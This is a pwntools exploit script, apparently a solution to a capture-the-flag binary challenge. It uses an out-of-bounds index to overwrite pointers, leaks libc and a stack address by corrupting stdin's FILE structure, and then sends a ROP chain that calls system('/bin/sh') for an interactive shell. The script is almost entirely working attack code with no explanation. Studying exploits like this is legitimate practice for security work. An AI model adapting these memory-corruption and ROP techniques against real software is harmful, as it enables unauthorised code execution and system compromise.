#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
#gdb.attach(p,gdbscript='''
#           b*0x000000000040132A
#           b*0x00000000004013CD
#           b*0x000000000040140F
#           ''')
input()
p.sendline(b'-1')
p.sendline(b'1')

#over write book to stdout
p.sendline(str(0x404030))
p.sendline(p64(0x404010))

# leak libc
input()
p.sendline(b'2')
p.recvuntil(b'your book: ')
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x2045c0 
log.info(f'libc.address: {hex(libc.address)}')

input()
p.sendline(b'1')
p.sendline(b'32')  # offset from stdout to book
p.sendline(p64(libc.sym._IO_2_1_stdin_ -8 ))

input()
p.sendline(b'1')
p.sendline(str(8 + 0xce0).encode())
fp = FileStructure()
fp.write(libc.sym.environ, 0x100)
p.sendline(bytes(fp)[:0x30])
p.recvuntil(b'0xfffff221')
stack_leak = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f'{hex(stack_leak) = }')

input('last input')
p.sendline(b'1')
p.sendline(str(8+0x38))
p.send(p64(stack_leak-0x150) + p64(stack_leak-0x150+0x100))

input('last input1')
rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b'/bin/sh\x00')))
p.sendline(rop.chain())
p.interactive()

p.interactive()
